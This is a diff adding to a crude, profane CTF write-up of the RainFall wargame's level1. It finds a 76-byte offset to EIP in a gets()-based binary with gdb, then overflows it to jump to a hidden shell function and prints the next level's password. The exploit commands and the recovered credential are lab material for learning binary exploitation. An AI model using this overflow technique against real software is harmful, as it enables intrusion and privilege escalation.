@@ -145,4 +145,56 @@ uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)
 ```
 **FUCKING KILL ME**, would've been so easyyyy, why is life so hard ans unfair
 #### getting the fucking offset to EIP, because I'm gay
-buffer oferflow occurs because the gets() function doesnt have a limit on the reading size, 
+buffer overflow occurs because the gets() function doesnt have a limit on the reading size
+```
+level1@RainFall:~$ python -c "print 'A' * 100" | ./level1 
+Segmentation fault (core dumped)
+```
+run it with gdb
+```
+level1@RainFall:~$ gdb ./level1 
+(gdb) r < /tmp/A
+Starting program: /home/user/level1/level1 < /tmp/A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info registers
+ebp            0x41414141       0x41414141
+eip            0x41414141       0x41414141
+```
+registers EIP and EBP were overwritten with AAAA.., so I kept trying stupid shit
+
+*with 100, it segfaults, 50 nope, 60 nope, 70 nope, **80** yes, now 75 nope, **76** ding ding ding*
+```
+(gdb) r
+Starting program: /home/user/level1/level1 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGILL, Illegal instruction.
+0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+```
+### writing payload
+offset is 76, maybe, and in gdn eip wasnt ovewritten with AAA.. like with offset 100
+
+So, I guess 'A' * 76 + [address_of_run = **0x08048444**]
+```
+rainfall git:(main) ✗ python -c 'print "A" * 76 + "\x44\x84\x04\x08"'
+```
+level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/tfou
+level1@RainFall:~$ cat /tmp/tfou | ./level1 
+Good... Wait what?
+Segmentation fault (core dumped)
+level1@RainFall:~$ cat /tmp/tfou -| ./level1 
+Good... Wait what?
+ls
+ls: cannot open directory .: Permission denied
+id  
+uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+*yay*
+```
+level1@RainFall:~$ su level2
+Password:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
